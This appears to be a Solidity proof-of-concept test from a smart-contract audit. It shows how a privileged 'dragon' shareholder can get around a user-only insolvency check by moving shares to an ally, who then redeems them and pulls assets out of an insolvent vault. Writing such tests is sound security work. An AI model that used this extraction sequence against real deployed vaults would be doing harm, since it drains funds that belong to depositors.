...
/// @notice Demonstrates obligations-insolvency extraction via dragon share transfer
contract DragonTransferBypassTest is Setup {
    ...
    function test_Bypass_DragonTransferAllowsExtractionWhenObligationsInsolvent() public {
        ...
        // 3) Crash: drop the exchange rate sharply without calling report
        //    This makes current value low while obligations (supply) remain high
        // Choose a rate so that: currentValue (assets * rate) is between userDebt and total obligations
        // With 1,000,000 assets and 500,000 dragon shares, pick 1.2x so currentValue = 1,200,000
        MockStrategySkimming(address(strategy)).updateExchangeRate(12e17); // 1.2 * 1e18

        // 4) Dragon transfers its shares to an ally (allowed by current user-only insolvency gate)
        vm.prank(dragon);
        bool ok = IMockStrategy(address(strategy)).transfer(ally, dragonShares);
        assertTrue(ok, "dragon transfer should succeed under user-only gate");

        // 5) Ally withdraws all received shares for assets (extraction during obligations-insolvency)
        uint256 allyShares = IMockStrategy(address(strategy)).balanceOf(ally);
        assertEq(allyShares, dragonShares, "ally should receive all dragon shares");

        vm.prank(ally);
        uint256 assetsOut = IMockStrategy(address(strategy)).redeem(allyShares, ally, ally);
        assertGt(assetsOut, 0, "ally should extract assets via redeemed dragon-origin shares");

        // 6) Vault assets reduced
        uint256 remainingAssets = IMockStrategy(address(strategy)).totalAssets();
        assertLt(remainingAssets, userDeposit, "assets must decrease after ally withdrawal");
    }
}
